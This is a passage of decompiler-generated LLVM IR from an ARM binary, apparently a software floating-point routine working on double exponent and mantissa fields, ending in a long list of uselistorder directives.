  %v1_34d6833 = phi i32 [ %v1_34d6834, %.thread6 ], [ %v6_34da0, %bb98 ]
  %v1_34d8444 = phi i32 [ %v1_34d8445, %.thread6 ], [ %v6_34da0, %bb98 ]
  %v1_34da053 = phi i32 [ %v1_34da0, %.thread6 ], [ %v6_34da0, %bb98 ]
  %v0_34db0 = phi i32 [ %v0_34d94, %.thread6 ], [ %v7_34d94, %bb98 ]
  %v1_34db4 = phi i32 [ %v1_34d98, %.thread6 ], [ %v3_34d98, %bb98 ]
  %v1_34da4 = urem i32 %v3_34d88, 2
  %v2_34da4 = icmp ne i32 %v1_34da4, 0
  %v3_34da4 = udiv i32 %v5_34dd817, 8
  %v3_34da8 = zext i1 %v2_34da4 to i32
  %v6_34da8 = and i64 %v14_34d8c, 4294967295
  %v7_34da8 = sub i32 33, %v15_34d8c
  %v8_34da8 = zext i32 %v7_34da8 to i64
  %v9_34da8 = shl i64 %v6_34da8, %v8_34da8
  %v10_34da8 = sub i32 32, %v15_34d8c
  %v11_34da8 = shl i32 %v3_34da8, %v10_34da8
  %v12_34da8 = zext i32 %v11_34da8 to i64
  %v14_34da8 = or i64 %v12_34da8, %v9_34da8
  %v15_34da8 = trunc i64 %v14_34da8 to i32
  %v3_34dac = icmp uge i32 %v1_34db4, %v15_34da8
  %v3_34db0 = icmp eq i1 %v3_34dac, false
  %v4_34db0 = sub i32 %v0_34db0, %v3_34da4
  %v6_34db0 = sext i1 %v3_34db0 to i32
  %v7_34db0 = add i32 %v6_34db0, %v4_34db0
  %v13_34db0 = icmp ult i32 %v0_34db0, %v3_34da4
  %v14_34db0 = or i1 %v13_34db0, %v3_34db0
  br i1 %v14_34db0, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_34db4 = sub i32 %v1_34db4, %v15_34da8
  store i32 %v3_34db4, i32* %r6.global-to-local, align 4
  store i32 %v7_34db0, i32* %r5.global-to-local, align 4
  %v5_34dbc = udiv i32 %v0_34de0, 8
  %v6_34dbc = or i32 %v1_34dbc, %v5_34dbc
  store i32 %v6_34dbc, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_34dcc = phi i32 [ %v1_34db4, %.thread8 ], [ %v3_34db4, %bb100 ]
  %v0_34dc8 = phi i32 [ %v0_34db0, %.thread8 ], [ %v7_34db0, %bb100 ]
  %v2_34e04 = phi i32 [ %v1_34dbc, %.thread8 ], [ %v6_34dbc, %bb100 ]
  %v1_34d6832 = phi i32 [ %v1_34d6833, %.thread8 ], [ %v6_34dbc, %bb100 ]
  %v1_34d8443 = phi i32 [ %v1_34d8444, %.thread8 ], [ %v6_34dbc, %bb100 ]
  %v1_34da052 = phi i32 [ %v1_34da053, %.thread8 ], [ %v6_34dbc, %bb100 ]
  %v2_34dc0 = or i32 %v0_34dc8, %v1_34dcc
  %v4_34dc0 = icmp eq i32 %v2_34dc0, 0
  br i1 %v4_34dc0, label %dec_label_pc_34e00, label %dec_label_pc_34dc8

dec_label_pc_34dc8:                               ; preds = %.thread10
  %v3_34dc8 = mul i32 %v0_34dc8, 16
  %v4_34dcc = udiv i32 %v1_34dcc, 268435456
  %v5_34dcc = or i32 %v3_34dc8, %v4_34dcc
  store i32 %v5_34dcc, i32* %r5.global-to-local, align 4
  %v3_34dd0 = mul i32 %v1_34dcc, 16
  store i32 %v3_34dd0, i32* %r6.global-to-local, align 4
  %v3_34dd4 = mul nuw i32 %v3_34da4, 8
  %v4_34dd8 = udiv i32 %v15_34da8, 536870912
  %v5_34dd8 = or i32 %v4_34dd8, %v3_34dd4
  %v3_34ddc = mul i32 %v15_34da8, 8
  %v3_34de0 = udiv i32 %v0_34de0, 16
  store i32 %v3_34de0, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_34de0, 16
  br i1 %tmp, label %dec_label_pc_34de8, label %dec_label_pc_34d58

dec_label_pc_34de8:                               ; preds = %dec_label_pc_34dc8
  %v1_34de8 = and i32 %v1_34e04.ph, 1048576
  %v2_34de8 = icmp eq i32 %v1_34de8, 0
  br i1 %v2_34de8, label %dec_label_pc_34df0, label %.thread11.loopexit

dec_label_pc_34df0:                               ; preds = %dec_label_pc_34de8
  %v2_34df0 = or i32 %v2_34e04, %v1_34e04.ph
  store i32 %v2_34df0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_34d58.outer

dec_label_pc_34e00:                               ; preds = %.thread10
  store i32 %v15_34da8, i32* %r2.global-to-local, align 4
  store i32 %v3_34da4, i32* %r3.global-to-local, align 4
  %v1_34e00 = and i32 %v1_34e04.ph, 1048576
  %v2_34e00 = icmp eq i32 %v1_34e00, 0
  br i1 %v2_34e00, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_34e00
  %v3_34e04 = or i32 %v2_34e04, %v1_34e04.ph
  store i32 %v3_34e04, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_34de8
  store i32 %v3_34ddc, i32* %r2.global-to-local, align 4
  store i32 %v5_34dd8, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_34e00, %bb101
  %v1_34e0c = add nsw i32 %v4_34d2c, 515
  store i32 %v1_34e0c, i32* %ip.global-to-local, align 4
  %v2_34e0c = icmp ugt i32 %v1_34d30, 252
  %v7_34e0c = icmp eq i32 %v1_34d30, 253
  %v2_34e10 = xor i1 %v7_34e0c, true
  %v3_34e10 = and i1 %v2_34e0c, %v2_34e10
  br i1 %v3_34e10, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_34e10 = icmp ugt i32 %v1_34e0c, 1791
  %v11_34e10 = icmp eq i32 %v1_34e0c, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_34e14 = phi i1 [ %v7_34e0c, %.thread11 ], [ %v11_34e10, %bb102 ]
  %v0_34e14 = phi i1 [ %v2_34e0c, %.thread11 ], [ %v6_34e10, %bb102 ]
  %v2_34e14 = xor i1 %v1_34e14, true
  %v3_34e14 = and i1 %v0_34e14, %v2_34e14
  call void @__pseudo_cond_branch(i1 %v3_34e14, i32 ptrtoint (i32* @global_var_34b28.2240 to i32))
  %v0_34e18 = load i32, i32* %r5.global-to-local, align 4
  %v1_34e18 = load i32, i32* %r3.global-to-local, align 4
  %v2_34e18 = sub i32 %v0_34e18, %v1_34e18
  store i32 %v2_34e18, i32* %ip.global-to-local, align 4
  %v3_34e18 = icmp uge i32 %v0_34e18, %v1_34e18
  %v9_34e18 = icmp eq i32 %v0_34e18, %v1_34e18
  br i1 %v9_34e18, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_34e1c = load i32, i32* %r6.global-to-local, align 4
  %v2_34e1c = load i32, i32* %r2.global-to-local, align 4
  %v3_34e1c = sub i32 %v1_34e1c, %v2_34e1c
  store i32 %v3_34e1c, i32* %ip.global-to-local, align 4
  %v4_34e1c = icmp uge i32 %v1_34e1c, %v2_34e1c
  %v10_34e1c = icmp eq i32 %v1_34e1c, %v2_34e1c
  br i1 %v10_34e1c, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_34e20 = load i32, i32* %r0.global-to-local, align 4
  %v2_34e20 = urem i32 %v1_34e20, 2
  %v3_34e20 = icmp ne i32 %v2_34e20, 0
  %v4_34e20 = udiv i32 %v1_34e20, 2
  store i32 %v4_34e20, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_34e24 = phi i1 [ %v3_34e18, %bb103 ], [ %v4_34e1c, %bb104 ], [ %v3_34e20, %bb105 ]
  %v0_34e24 = load i32, i32* %r0.global-to-local, align 4
  %v2_34e24 = zext i1 %v1_34e24 to i32
  %v3_34e24 = add i32 %v2_34e24, %v0_34e24
  store i32 %v3_34e24, i32* %r0.global-to-local, align 4
  %v0_34e28 = load i32, i32* %r1.global-to-local, align 4
  %v1_34e28 = load i32, i32* %r4.global-to-local, align 4
  %v2_34e28 = and i32 %v1_34e28, 4096
  %v3_34e28 = icmp ne i32 %v2_34e28, 0
  %v4_34e28 = mul i32 %v1_34e28, 1048576
  %v6_34e28 = add i32 %v4_34e28, %v0_34e28
  %v7_34e28 = zext i1 %v3_34e28 to i32
  %v8_34e28 = add i32 %v7_34e28, %v6_34e28
  store i32 %v8_34e28, i32* %r1.global-to-local, align 4
  %v2_34e2c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_34e2c, i32* %r4.global-to-local, align 4
  store i32 %v6_34ccc, i32* %r5.global-to-local, align 4
  store i32 %v9_34ccc, i32* %r6.global-to-local, align 4
  ret i32 %v3_34e24

dec_label_pc_34e34:                               ; preds = %dec_label_pc_34cec
  %v1_34e34 = and i32 %v2_34cf0, -2147483648
  %v4_34e38 = urem i32 %v1_34cd8, 1048576
  %v5_34e38 = or i32 %v1_34e34, %v4_34e38
  store i32 %v5_34e38, i32* %r1.global-to-local, align 4
  %v6_34e3c = add nsw i32 %v2_34cec, 1023
  store i32 %v6_34e3c, i32* %r4.global-to-local, align 4
  %v8_34e3c = sub nsw i32 0, %v2_34cec
  %v9_34e3c = and i32 %v6_34e3c, %v8_34e3c
  %v11_34e3c = icmp slt i32 %v2_34cec, -1023
  %v12_34e3c = icmp eq i32 %v6_34e3c, 0
  %v7_34e40 = icmp sgt i32 %v2_34cec, -1023
  br i1 %v7_34e40, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_34e34
  %v10_34e40 = sub nsw i32 1024, %v2_34cec
  store i32 %v10_34e40, i32* %r5.global-to-local, align 4
  %v14_34e40 = and i32 %v10_34e40, %v6_34e3c
  %v16_34e40 = icmp slt i32 %v10_34e40, 0
  %v17_34e40 = icmp eq i32 %v6_34e3c, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_34e34, %bb106
  %v3_34e4c.in = phi i32 [ %v9_34e3c, %dec_label_pc_34e34 ], [ %v14_34e40, %bb106 ]
  %v2_34e4c = phi i1 [ %v11_34e3c, %dec_label_pc_34e34 ], [ %v16_34e40, %bb106 ]
  %v1_34e4c = phi i1 [ %v12_34e3c, %dec_label_pc_34e34 ], [ %v17_34e40, %bb106 ]
  %v3_34e4c = icmp slt i32 %v3_34e4c.in, 0
  %v3_34e44 = xor i1 %v3_34e4c, %v2_34e4c
  %v4_34e44 = or i1 %v1_34e4c, %v3_34e44
  br i1 %v4_34e44, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_34e4484 = mul i32 %v6_34e3c, 1048576
  %v10_34e4485 = or i32 %v9_34e4484, %v5_34e38
  store i32 %v10_34e4485, i32* %r1.global-to-local, align 4
  store i32 %v3_34ccc, i32* %r4.global-to-local, align 4
  store i32 %v6_34ccc, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_34e4c = phi i32 [ %v12_34ccc, %bb108 ], [ %v1_34e34, %bb107 ]
  %v6_34e4c = xor i1 %v4_34e44, true
  call void @__pseudo_cond_branch(i1 %v6_34e4c, i32 %v0_34e4c)
  %v0_34e50 = load i32, i32* %r1.global-to-local, align 4
  %v1_34e50 = or i32 %v0_34e50, 1048576
  store i32 %v1_34e50, i32* @r1, align 4
  %v0_34e58 = load i32, i32* %r4.global-to-local, align 4
  %v1_34e58 = add i32 %v0_34e58, -1
  store i32 %v1_34e58, i32* @r4, align 4
  %v3_34e58 = sub i32 0, %v0_34e58
  %v4_34e58 = and i32 %v0_34e58, %v3_34e58
  %v5_34e58 = icmp slt i32 %v4_34e58, 0
  store i1 %v5_34e58, i1* @cpsr_v, align 1
  %v6_34e58 = icmp slt i32 %v1_34e58, 0
  store i1 %v6_34e58, i1* @cpsr_n, align 1
  %v7_34e58 = icmp eq i32 %v0_34e58, 1
  store i1 %v7_34e58, i1* @cpsr_z, align 1
  %v0_34e5c = call i32 @function_34b28()
  store i32 %v0_34e5c, i32* @r0, align 4
  %v0_34e64 = call i32 @function_34b28()
  store i32 %v0_34e64, i32* @r0, align 4
  %v0_34e68.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_34e6c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_34e68

dec_label_pc_34e68:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_34e68.pre-phi = phi i32 [ %v5_34cdc, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_34cdc, %bb91 ], [ %v5_34cdc, %.thread ]
  %v0_34e6c = phi i32 [ %v5_34cd8, %.thread1 ], [ %v5_34cd8, %.thread2 ], [ %v5_34cd8, %bb91 ], [ %v0_34e6c.pre, %.thread ]
  %v2_34e70 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_34e68.pre, %.thread ]
  %v5_34e68 = and i32 %v2_34e70, %v4_34e68.pre-phi
  store i32 %v5_34e68, i32* @r5, align 4
  %v4_34e6c = icmp eq i32 %v2_34e70, %v0_34e6c
  br i1 %v4_34e6c, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_34e68
  %v5_34e70 = icmp eq i32 %v5_34e68, %v2_34e70
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_34e68, %bb109
  %v0_34e74 = phi i1 [ false, %dec_label_pc_34e68 ], [ %v5_34e70, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_34e74, i32 ptrtoint (i32* @global_var_34cbc.2242 to i32))
  %v0_34e78 = load i32, i32* @r4, align 4
  %v1_34e78 = load i32, i32* %ip.global-to-local, align 4
  %v4_34e78 = icmp eq i32 %v1_34e78, %v0_34e78
  br i1 %v4_34e78, label %dec_label_pc_34e80, label %dec_label_pc_34e9c

dec_label_pc_34e80:                               ; preds = %bb110
  %v0_34e80 = load i32, i32* @r0, align 4
  %v1_34e80 = load i32, i32* @r1, align 4
  %v4_34e80 = mul i32 %v1_34e80, 4096
  %v5_34e80 = or i32 %v4_34e80, %v0_34e80
  store i32 %v5_34e80, i32* %r4.global-to-local, align 4
  %v1_34e84 = icmp ne i32 %v5_34e80, 0
  call void @__pseudo_cond_branch(i1 %v1_34e84, i32 ptrtoint (i32* @global_var_34cbc.2242 to i32))
  %v0_34e88 = load i32, i32* @r5, align 4
  %v1_34e88 = load i32, i32* %ip.global-to-local, align 4
  %v1_34e8c = icmp ne i32 %v1_34e88, %v0_34e88
  call void @__pseudo_cond_branch(i1 %v1_34e8c, i32 ptrtoint (i32* @global_var_34ca0.2243 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_34e98 = call i32 @function_34cbc(i32 %arg3, i32 %arg4)
  store i32 %v2_34e98, i32* @r0, align 4
  %v1_34e9c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_34e9c

dec_label_pc_34e9c:                               ; preds = %bb110, %dec_label_pc_34e80
  %v1_34e9c = phi i32 [ %v1_34e78, %bb110 ], [ %v1_34e9c.pre, %dec_label_pc_34e80 ]
  %v0_34e9c = load i32, i32* @r5, align 4
  %v4_34e9c = icmp eq i32 %v0_34e9c, %v1_34e9c
  br i1 %v4_34e9c, label %dec_label_pc_34ea4, label %dec_label_pc_34e9c.dec_label_pc_34eb8_crit_edge

dec_label_pc_34e9c.dec_label_pc_34eb8_crit_edge:  ; preds = %dec_label_pc_34e9c
  %v0_34eb8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_34eb8

dec_label_pc_34ea4:                               ; preds = %dec_label_pc_34e9c
  %v4_34ea4 = mul i32 %arg4, 4096
  %v5_34ea4 = or i32 %v4_34ea4, %arg3
  store i32 %v5_34ea4, i32* %r5.global-to-local, align 4
  %v7_34ea4 = icmp eq i32 %v5_34ea4, 0
  call void @__pseudo_cond_branch(i1 %v7_34ea4, i32 ptrtoint (i32* @global_var_34c50.2244 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_34eb4 = call i32 @function_34cbc(i32 %arg3, i32 %arg4)
  store i32 %v2_34eb4, i32* @r0, align 4
  br label %dec_label_pc_34eb8

dec_label_pc_34eb8:                               ; preds = %dec_label_pc_34e9c.dec_label_pc_34eb8_crit_edge, %dec_label_pc_34ea4
  %v0_34eb8 = phi i32 [ %v0_34eb8.pre, %dec_label_pc_34e9c.dec_label_pc_34eb8_crit_edge ], [ %v2_34eb4, %dec_label_pc_34ea4 ]
  %v1_34eb8 = load i32, i32* @r1, align 4
  %v3_34eb8 = mul i32 %v1_34eb8, 2
  %v4_34eb8 = or i32 %v3_34eb8, %v0_34eb8
  store i32 %v4_34eb8, i32* %r6.global-to-local, align 4
  %v6_34eb8 = icmp eq i32 %v4_34eb8, 0
  br i1 %v6_34eb8, label %dec_label_pc_34eb8._crit_edge, label %bb111

dec_label_pc_34eb8._crit_edge:                    ; preds = %dec_label_pc_34eb8
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_34eb8
  %v4_34ebc = mul i32 %arg4, 2
  %v5_34ebc = or i32 %v4_34ebc, %arg3
  store i32 %v5_34ebc, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_34ebc, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_34eb8._crit_edge, %bb111
  %v4_34ecc.pre-phi = phi i32 [ %.pre80, %dec_label_pc_34eb8._crit_edge ], [ %v5_34ebc, %bb111 ]
  %v0_34ec0 = phi i1 [ false, %dec_label_pc_34eb8._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_34ec0, i32 ptrtoint (i32* @global_var_34be8.2245 to i32))
  %v0_34ec4 = load i32, i32* @r0, align 4
  %v1_34ec4 = load i32, i32* @r1, align 4
  %v3_34ec4 = mul i32 %v1_34ec4, 2
  %v4_34ec4 = or i32 %v3_34ec4, %v0_34ec4
  store i32 %v4_34ec4, i32* %r4.global-to-local, align 4
  %v1_34ec8 = icmp ne i32 %v4_34ec4, 0
  call void @__pseudo_cond_branch(i1 %v1_34ec8, i32 ptrtoint (i32* @global_var_34ca0.2243 to i32))
  store i32 %v4_34ecc.pre-phi, i32* %r5.global-to-local, align 4
  %v1_34ed0 = icmp ne i32 %v4_34ecc.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_34ed0, i32 ptrtoint (i32* @global_var_34c50.2244 to i32))
  %v0_34ed4 = load i32, i32* @r0, align 4
  %v1_34ed4 = load i32, i32* @r1, align 4
  %v2_34ed4 = call i32 @function_34cbc(i32 %v0_34ed4, i32 %v1_34ed4)
  store i32 %v2_34ed4, i32* %r0.global-to-local, align 4
  ret i32 %v2_34ed4

; uselistorder directives
  uselistorder i32 %v5_34ebc, { 1, 0, 2 }
  uselistorder i32 %v1_34e78, { 1, 0 }
  uselistorder i32 %v1_34e58, { 1, 0 }
  uselistorder i32 %v0_34e58, { 3, 1, 0, 2 }
  uselistorder i32 %v10_34e40, { 2, 0, 1 }
  uselistorder i32 %v6_34e3c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_34e34, { 1, 0 }
  uselistorder i32 %v2_34e1c, { 1, 0, 2 }
  uselistorder i32 %v1_34e1c, { 1, 0, 2 }
  uselistorder i32 %v1_34e18, { 1, 0, 2 }
  uselistorder i32 %v0_34e18, { 1, 0, 2 }
  uselistorder i1 %v7_34e0c, { 1, 0 }
  uselistorder i32 %v2_34df0, { 1, 0 }
  uselistorder i32 %v3_34ddc, { 2, 1, 0 }
  uselistorder i32 %v3_34dd0, { 0, 2, 1 }
  uselistorder i32 %v5_34dcc, { 2, 0, 1 }
  uselistorder i32 %v6_34dbc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_34da8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_34da4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_34db0, { 0, 2, 1 }
  uselistorder i32 %v1_34dbc, { 1, 0 }
  uselistorder i32 %v6_34da0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_34d8c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_34d88, { 0, 2, 1 }
  uselistorder i32 %v0_34d94, { 0, 2, 1 }
  uselistorder i32 %v1_34da0, { 1, 0 }
  uselistorder i32 %v6_34d84, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_34d70, { 1, 2, 0, 3 }
  uselistorder i32 %v0_34d78, { 0, 2, 1 }
  uselistorder i32 %v1_34d84, { 1, 0 }
  uselistorder i32 %v3_34d68, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_34d5c, { 1, 2, 0 }
  uselistorder i32 %v3_34ddc13, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_34dd817, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_34d5c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_34d68, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_34e04.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_34d48, { 1, 0 }
  uselistorder i32 %v0_34d4c, { 1, 0 }
  uselistorder i32 %v3_34d38, { 1, 0 }
  uselistorder i1 %v1_34d2c, { 1, 0 }
  uselistorder i32 %v3_34d1c, { 2, 3, 1, 0 }
  uselistorder i32 %v5_34d18, { 3, 2, 1, 0 }
  uselistorder i32 %v3_34d10, { 2, 1, 0 }
  uselistorder i32 %v5_34d0c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_34cec, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_34cdc, { 2, 3, 1, 0 }
  uselistorder i32 %v5_34cdc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_34cd8, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_34cd8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_34ccc, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 7, 8, 2, 3, 4, 5, 6, 9 }
  uselistorder i32* %ip.global-to-local, { 7, 8, 9, 6, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_34cbc, { 2, 1, 0 }
  uselistorder i32 ()* @function_34b28, { 1, 0 }
  uselistorder i32 1024, { 9, 12, 46, 47, 10, 48, 13, 14, 0, 81, 77, 11, 45, 82, 15, 83, 8, 78, 79, 80, 1, 2, 3, 4, 5, 6, 7, 16, 49, 26, 50, 51, 25, 52, 53, 24, 54, 55, 23, 56, 57, 22, 58, 59, 21, 60, 61, 20, 62, 63, 19, 64, 65, 18, 66, 67, 17, 68, 69, 70, 71, 27, 72, 73, 30, 39, 29, 40, 28, 41, 33, 42, 32, 43, 31, 44, 74, 34, 75, 35, 36, 76, 37, 38 }
  uselistorder i32 1023, { 0, 1, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 252, { 7, 8, 0, 9, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 536870912, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 16, { 4, 10, 8, 9, 11, 300, 301, 55, 149, 302, 145, 303, 146, 147, 74, 148, 36, 150, 0, 151, 304, 42, 248, 249, 256, 257, 12, 258, 13, 305, 75, 56, 306, 126, 76, 307, 43, 127, 77, 128, 129, 130, 308, 78, 79, 80, 165, 309, 310, 311, 14, 15, 259, 260, 312, 313, 167, 168, 169, 170, 261, 262, 152, 153, 154, 155, 16, 17, 18, 263, 264, 81, 176, 265, 267, 277, 278, 279, 156, 157, 158, 159, 160, 161, 162, 163, 164, 335, 82, 166, 57, 58, 59, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 272, 273, 274, 250, 251, 314, 315, 316, 317, 318, 319, 320, 321, 325, 326, 327, 322, 60, 328, 252, 253, 83, 84, 254, 255, 171, 172, 173, 44, 266, 61, 174, 299, 175, 268, 269, 270, 271, 336, 5, 337, 338, 1, 339, 340, 280, 281, 282, 286, 177, 2, 178, 283, 19, 284, 285, 37, 131, 132, 31, 32, 133, 134, 136, 135, 137, 138, 140, 141, 139, 142, 143, 144, 287, 39, 288, 289, 290, 291, 292, 275, 276, 293, 294, 295, 329, 330, 331, 332, 333, 334, 123, 323, 324, 179, 296, 20, 188, 21, 33, 22, 23, 6, 24, 25, 26, 34, 27, 28, 7, 29, 30, 38, 180, 3, 181, 116, 352, 117, 35, 182, 118, 183, 184, 185, 186, 119, 187, 120, 224, 225, 353, 354, 355, 121, 85, 189, 86, 87, 122, 190, 88, 191, 192, 45, 193, 89, 194, 47, 195, 46, 196, 90, 197, 198, 62, 91, 124, 40, 50, 63, 92, 125, 41, 51, 93, 199, 94, 200, 95, 201, 202, 203, 96, 204, 52, 205, 97, 206, 207, 98, 99, 208, 100, 209, 101, 53, 210, 211, 64, 65, 66, 212, 213, 102, 214, 215, 67, 216, 217, 103, 218, 219, 68, 220, 221, 69, 222, 104, 223, 226, 70, 227, 105, 228, 106, 229, 107, 230, 108, 231, 232, 233, 109, 234, 235, 71, 236, 110, 237, 111, 238, 239, 72, 240, 241, 242, 243, 244, 112, 54, 73, 245, 246, 247, 48, 297, 113, 298, 49, 114, 115 }
  uselistorder i32 8, { 2, 3, 4, 5, 6, 7, 127, 175, 367, 88, 170, 171, 370, 371, 172, 173, 174, 89, 176, 316, 317, 324, 325, 326, 327, 328, 8, 329, 372, 373, 187, 177, 103, 178, 9, 135, 137, 139, 140, 136, 138, 141, 142, 374, 375, 376, 377, 378, 143, 144, 145, 179, 368, 369, 379, 380, 10, 381, 45, 330, 331, 332, 333, 44, 382, 200, 201, 202, 203, 334, 180, 335, 336, 337, 338, 339, 50, 181, 11, 104, 46, 12, 182, 183, 184, 185, 186, 105, 106, 13, 14, 107, 15, 108, 188, 420, 189, 190, 191, 192, 419, 193, 194, 195, 196, 197, 198, 199, 454, 78, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 348, 383, 384, 385, 386, 387, 388, 389, 390, 391, 16, 79, 392, 64, 393, 394, 128, 395, 396, 397, 398, 399, 318, 319, 320, 321, 322, 323, 204, 205, 206, 207, 90, 491, 492, 297, 51, 208, 17, 364, 365, 209, 210, 48, 480, 481, 482, 483, 484, 485, 486, 487, 18, 109, 472, 473, 474, 475, 476, 477, 478, 479, 19, 340, 341, 342, 343, 344, 345, 346, 347, 421, 422, 423, 424, 425, 20, 426, 427, 21, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 445, 438, 439, 440, 441, 110, 37, 442, 443, 444, 111, 112, 22, 446, 447, 448, 449, 451, 452, 113, 23, 453, 24, 450, 350, 351, 211, 212, 352, 213, 91, 92, 129, 302, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 25, 165, 166, 167, 353, 82, 83, 80, 81, 38, 39, 54, 55, 84, 493, 354, 349, 355, 356, 402, 403, 130, 404, 405, 406, 407, 47, 408, 114, 115, 409, 410, 411, 85, 412, 413, 414, 415, 40, 41, 416, 417, 418, 116, 400, 401, 214, 357, 49, 358, 359, 360, 262, 263, 246, 93, 94, 131, 52, 26, 27, 35, 28, 132, 53, 29, 30, 36, 31, 117, 118, 119, 120, 121, 122, 123, 215, 216, 488, 168, 217, 218, 219, 220, 221, 224, 225, 226, 169, 227, 228, 229, 230, 366, 222, 223, 231, 232, 233, 234, 235, 236, 237, 238, 95, 489, 239, 240, 241, 490, 242, 243, 244, 245, 249, 250, 251, 252, 247, 248, 253, 254, 124, 32, 96, 97, 98, 99, 100, 255, 101, 256, 257, 258, 259, 260, 261, 264, 265, 69, 68, 86, 76, 67, 66, 133, 65, 56, 266, 74, 73, 87, 77, 72, 71, 134, 70, 57, 267, 268, 269, 270, 125, 42, 33, 271, 272, 126, 43, 34, 273, 274, 275, 75, 276, 277, 278, 279, 280, 281, 282, 0, 283, 284, 285, 286, 287, 288, 58, 289, 290, 291, 59, 292, 293, 294, 295, 296, 298, 60, 299, 300, 301, 303, 304, 305, 61, 306, 307, 308, 309, 310, 62, 311, 312, 313, 63, 314, 315, 102, 361, 362, 363, 1 }
